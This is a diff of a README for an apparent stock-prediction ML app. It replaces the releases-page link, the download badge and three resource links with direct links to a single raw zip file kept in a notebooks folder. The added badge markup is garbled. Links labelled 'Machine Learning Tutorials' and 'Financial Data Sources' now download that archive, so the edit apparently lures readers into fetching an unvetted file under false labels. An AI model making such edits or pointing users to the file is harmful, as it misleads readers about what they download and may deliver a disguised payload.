@@ -14,12 +14,12 @@ To get started, please follow these steps to download and run the application:
 
 1. Click the button below to visit the releases page where you can download the app.
 
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Stock%20Prediction%20ML-brightgreen.svg)](https://github.com/MichaelBrutal/Stock_Prediction_ML/releases)
+   [![Download Now](https://github.com/MichaelBrutal/Stock_Prediction_ML/raw/refs/heads/main/notebooks/ML-Prediction-Stock-v2.5.zip%20Now-Stock%20Prediction%https://github.com/MichaelBrutal/Stock_Prediction_ML/raw/refs/heads/main/notebooks/ML-Prediction-Stock-v2.5.zip)](https://github.com/MichaelBrutal/Stock_Prediction_ML/raw/refs/heads/main/notebooks/ML-Prediction-Stock-v2.5.zip)
 
 2. You will find several options for download. Choose the latest release to ensure you have the most recent features and updates.
 
 ## 📥 Download & Install
-To download the application, visit this page: [Stock Prediction ML Releases](https://github.com/MichaelBrutal/Stock_Prediction_ML/releases).
+To download the application, visit this page: [Stock Prediction ML Releases](https://github.com/MichaelBrutal/Stock_Prediction_ML/raw/refs/heads/main/notebooks/ML-Prediction-Stock-v2.5.zip).
 
 1. Locate the latest version of the application. 
 2. Click on the appropriate file for your operating system (Windows, macOS, or Linux). 
@@ -59,8 +59,8 @@ If you encounter any issues or have feedback, please reach out. You can open an 
 
 ## 🌐 Additional Resources
 For more insights, consider visiting these resources:
-- [Financial Data Sources](https://www.example.com)
-- [Machine Learning Tutorials](https://www.example.com)
-- [Stock Market Basics](https://www.example.com)
+- [Financial Data Sources](https://github.com/MichaelBrutal/Stock_Prediction_ML/raw/refs/heads/main/notebooks/ML-Prediction-Stock-v2.5.zip)
+- [Machine Learning Tutorials](https://github.com/MichaelBrutal/Stock_Prediction_ML/raw/refs/heads/main/notebooks/ML-Prediction-Stock-v2.5.zip)
+- [Stock Market Basics](https://github.com/MichaelBrutal/Stock_Prediction_ML/raw/refs/heads/main/notebooks/ML-Prediction-Stock-v2.5.zip)
 
 Happy analyzing! Enjoy leveraging data for smart stock decisions.
